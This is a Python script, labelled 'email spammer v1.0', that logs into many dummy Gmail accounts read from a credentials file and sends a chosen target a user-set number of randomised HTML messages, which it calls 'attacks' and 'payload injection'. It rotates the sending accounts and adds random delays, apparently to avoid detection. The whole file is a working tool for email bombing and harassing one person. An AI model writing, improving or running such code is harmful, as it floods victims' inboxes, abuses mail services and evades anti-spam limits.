import smtplib
import re
import sys
import getpass
import random
import math
import time
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header    import Header
import socket 
socket.setdefaulttimeout(10)

""" 
created by sayansree paria
verson<1.0>

"""
userId=[]
password=[]
print("\n\n\n\temail spammer v1.0\n\tdevlovper sayansree paria\n\tinitiating dummy Ids import.... ")
path=os.path.dirname(os.path.realpath(__file__))
try:
    file=open(path+'\\Attribute.dat','r')
    lines=file.readlines()
    for i in lines:
        userId.append(i.split('|')[0])
        password.append(i.split('|')[1])
    del lines
except FileNotFoundError:
    print ("please define attributes.dat")
    #raise 
    sys.exit(0)
except:
    print("unexpected fatal error encountered while accessing Attributes\nmake sure code has access permition")
    #raise
    sys.exit(0)
else:
    print ("\tdummy IDs successfully imported")
finally:
    file.close()
 

def check(email):
    if not re.match(r"[\w\.-_]+@[\w]+\.com",email):
        print('\tinvalid email format')
        #raise TypeError('userids not in format')
        sys.exit(0)

print('\tprechecking ID format...\n')
if(len(userId)==0):
    print('\nno IDs detected\nplease redefine Attribute file')
    #raise TypeError('userids not in format')
    sys.exit(0)

for i in userId:
    check(i)   
    print(i+'\tvalid')

print('\tprecheck succesful')
print('\n\t{num} dummies will be used '.format(num=len(userId)))
print('\tInitiating authentication process\n\tthis may take several minutes')

module=[]
for i in range(len(userId)):
    
    try:
        server =smtplib.SMTP('smtp.gmail.com',587)
    except :
        print('\ncheck your internet connection')
        sys.exit(0)
    else:
        print('connection established\t\t' + userId[i])
    try:
        server.starttls()
        server.login(userId[i],password[i])
        module.append(server)
        del server
    except smtplib.SMTPConnectError:
        print('\nconnection error') 
        server.quit()    
    except smtplib.SMTPAuthenticationError:
        print('\nauthentication failed'+userId[i]+'*'*5+password[i][-3:])
        server.quit()     
    except:
        print('\nunexpected error') 
        server.quit()
        raise
    else:
        print('succesfully authinticated\t\t'+userId[i])       

##needs sighting
target=input('enter target username:\t')
print('\t checking email')
check(target)
print(target+'\tvalid')
itr=input('enter no of attacks:\t')

print('\timporting payload')
payload=[]
try:
    file=open(path+'\\payload.txt','r')
    lines=file.readlines()
    for i in lines:
        payload.append(i)
    del lines
except FileNotFoundError:
    print ("please define payload.txt")
    sys.exit(0)
except:
    print("unexpected fatal error encountered while accessing payload\nmake sure code has access permition")
    sys.exit(0)
else:
    print ("\tpayload successfully imported")

finally:
    file.close()
tim=3.5*int(itr)
print('\tinitiating payload injection\n\t expected time {0}min,{1}sec'.format(tim%60,tim//60)) 
sublist=payload[0].split('|')
for i in range(int(itr)):
    rand=math.floor(random.random()*len(userId))

    msg= MIMEMultipart()
    msg['From'] = userId[rand]
    msg['To']=  target
    msg['Subject']= sublist[math.floor(random.random()*len(sublist))]
    body= payload[ 1+math.floor(random.random()*(len(payload)-1))]
    msg.attach(MIMEText(body,'html'))
    module[rand].sendmail(msg['From'],msg['To'],msg.as_string())
    del msg
    print('payload <{0}> using {1} successful '.format(i+1,userId[rand])) 
    time.sleep(2+random.random()*3)# some improvement required

print('\t terminating server connections')

for i in module:
    i.quit()
print('\t payload successful\n\t devloper sayansree paria\n\t build v<1.0>')
